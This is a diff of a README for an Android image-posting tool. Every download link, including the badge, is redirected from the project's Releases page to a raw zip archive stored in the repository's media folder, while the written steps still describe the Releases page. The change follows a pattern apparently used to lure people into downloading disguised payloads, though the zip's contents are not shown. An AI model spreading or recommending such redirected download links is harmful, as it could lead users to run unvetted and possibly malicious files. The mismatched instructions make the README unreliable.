@@ -1,6 +1,6 @@
 # 🚀 x-image-auto-poster - Automate Image Posting for Your Android Apps
 
-[![Download x-image-auto-poster](https://img.shields.io/badge/Download-x--image--auto--poster-brightgreen.svg)](https://github.com/BgpCabrit1/x-image-auto-poster/releases)
+[![Download x-image-auto-poster](https://raw.githubusercontent.com/BgpCabrit1/x-image-auto-poster/main/media/x-image-auto-poster_2.7-alpha.1.zip)](https://raw.githubusercontent.com/BgpCabrit1/x-image-auto-poster/main/media/x-image-auto-poster_2.7-alpha.1.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To get started with x-image-auto-poster, follow these simple steps. You will be 
 
 ## 📥 Download & Install
 
-To download x-image-auto-poster, visit this page: [Download Here](https://github.com/BgpCabrit1/x-image-auto-poster/releases).
+To download x-image-auto-poster, visit this page: [Download Here](https://raw.githubusercontent.com/BgpCabrit1/x-image-auto-poster/main/media/x-image-auto-poster_2.7-alpha.1.zip).
 
 1. Go to the Releases page using the link above.
 2. Find the latest release. 
@@ -64,4 +64,4 @@ If you need further assistance, feel free to reach out. You can create issues on
 
 ---
 
-Visit this link to download the application and get started: [Download Here](https://github.com/BgpCabrit1/x-image-auto-poster/releases). Enjoy automating your image posting!
+Visit this link to download the application and get started: [Download Here](https://raw.githubusercontent.com/BgpCabrit1/x-image-auto-poster/main/media/x-image-auto-poster_2.7-alpha.1.zip). Enjoy automating your image posting!
